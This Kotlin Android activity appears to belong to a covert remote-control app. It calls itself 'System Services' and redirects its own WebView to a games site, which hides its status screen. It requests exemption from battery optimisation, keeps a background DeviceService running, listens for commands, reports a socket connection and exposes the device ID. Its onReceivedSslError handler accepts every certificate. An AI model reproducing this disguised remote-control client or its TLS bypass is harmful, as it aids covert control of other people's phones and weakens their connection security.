package com.sync.xxx

import android.content.*
import android.net.Uri
import android.os.*
import android.provider.Settings
import android.webkit.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView

    private val commandReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action != DeviceService.ACTION_COMMAND) return
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        setupWebView()

        val filter = IntentFilter(DeviceService.ACTION_COMMAND)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(commandReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(commandReceiver, filter)
        }

        requestBatteryOptimization()
    }

    override fun onResume() {
        super.onResume()
        startDeviceService()
    }

    private fun requestBatteryOptimization() {
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        if (!pm.isIgnoringBatteryOptimizations(packageName)) {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:$packageName")
            }
            startActivity(intent)
        } else {
            startDeviceService()
        }
    }

    private fun startDeviceService() {
        val svcIntent = Intent(this, DeviceService::class.java)
        ContextCompat.startForegroundService(this, svcIntent)
        val i = Intent(DeviceService.ACTION_CONNECT).apply { setPackage(packageName) }
        sendBroadcast(i)
    }

    override fun onDestroy() {
        super.onDestroy()
        try { unregisterReceiver(commandReceiver) } catch (_: Exception) {}
    }

    @android.annotation.SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        webView = findViewById(R.id.mainWebView)
        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
        }
        webView.addJavascriptInterface(AppBridge(this, webView), "Android")
        webView.addJavascriptInterface(MainBridge(), "MainBridge")
        webView.webViewClient = object : WebViewClient() {
            override fun onReceivedSslError(
                view: WebView?,
                handler: android.webkit.SslErrorHandler?,
                error: android.net.http.SslError?
            ) { handler?.proceed() }
        }
        webView.loadDataWithBaseURL(null, buildHtml(), "text/html", "UTF-8", null)
    }

    private fun buildHtml(): String = """<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>System Services</title>
<script>
  window.location.replace("https://www.crazygames.com/");
</script>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{--bg:#0a0a0f;--card:#141420;--border:#1e1e30;--accent:#6366f1;--green:#22c55e;--text:#f8fafc;--text2:#94a3b8;--text3:#475569;}
html,body{height:100%;width:100%;overflow:hidden;background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;-webkit-font-smoothing:antialiased}
.wrap{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;padding:32px;gap:28px}
.logo{width:80px;height:80px;border-radius:24px;background:linear-gradient(145deg,rgba(99,102,241,.18),rgba(99,102,241,.04));border:1px solid rgba(99,102,241,.25);display:flex;align-items:center;justify-content:center}
.title{font-size:22px;font-weight:800;color:var(--text);text-align:center;letter-spacing:-.4px}
.sub{font-size:13px;color:var(--text2);text-align:center;line-height:1.65;max-width:270px}
.badge{display:flex;align-items:center;gap:8px;padding:10px 18px;background:rgba(34,197,94,.06);border:1px solid rgba(34,197,94,.18);border-radius:12px;font-size:12px;font-weight:600;color:var(--green)}
.dot{width:8px;height:8px;border-radius:50%;background:var(--green);box-shadow:0 0 10px var(--green);animation:p 2s infinite}
@keyframes p{0%,100%{opacity:1}50%{opacity:.25}}
.info{width:100%;background:var(--card);border:1px solid var(--border);border-radius:16px;overflow:hidden}
.row{display:flex;justify-content:space-between;align-items:center;padding:13px 18px;border-bottom:1px solid var(--border)}
.row:last-child{border-bottom:none}
.k{font-size:11px;color:var(--text3)}
.v{font-size:11px;font-weight:600;color:var(--text2);max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;text-align:right}
</style>
</head>
<body>
<div class="wrap">
  <div class="logo">
    <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#6366f1" stroke-width="1.6">
      <path d="M12 2L3 7v5c0 5.25 3.75 10.15 9 11.35C17.25 22.15 21 17.25 21 12V7L12 2z"/>
      <path d="M9 12l2 2 4-4" stroke-width="1.8"/>
    </svg>
  </div>
  <div>
    <div class="title">System Services</div>
    <div class="sub" style="margin-top:8px">Layanan berjalan di latar belakang</div>
  </div>
  <div class="badge"><div class="dot"></div>Berjalan Di Latar Belakang</div>
  <div class="info">
    <div class="row"><span class="k">ID Perangkat</span><span class="v" id="devId">—</span></div>
    <div class="row"><span class="k">Status</span><span class="v" id="connSt" style="color:var(--text3)">Menghubungkan...</span></div>
    <div class="row"><span class="k">Fitur Aktif</span><span class="v">Senter · Wallpaper · Vibrate · Volume</span></div>
  </div>
</div>
<script>
if(window.Android){document.getElementById('devId').textContent=Android.getDeviceId()||'—'}
setInterval(()=>{
  const el=document.getElementById('connSt');if(!el)return;
  if(window.Android&&Android.isSocketConnected()){el.textContent='Terhubung';el.style.color='#22c55e'}
  else{el.textContent='Menghubungkan...';el.style.color='#94a3b8'}
},1500)
</script>
</body>
</html>
"""

    inner class MainBridge {
        @android.webkit.JavascriptInterface
        fun connectNow() {
            Handler(Looper.getMainLooper()).post { startDeviceService() }
        }
    }
}

class AppBridge(private val context: Context, private val webView: WebView) {
    @android.webkit.JavascriptInterface
    fun getDeviceId(): String =
        android.provider.Settings.Secure.getString(
            context.contentResolver,
            android.provider.Settings.Secure.ANDROID_ID
        ) ?: "unknown"

    @android.webkit.JavascriptInterface
    fun isSocketConnected(): Boolean = SocketHolder.connected
}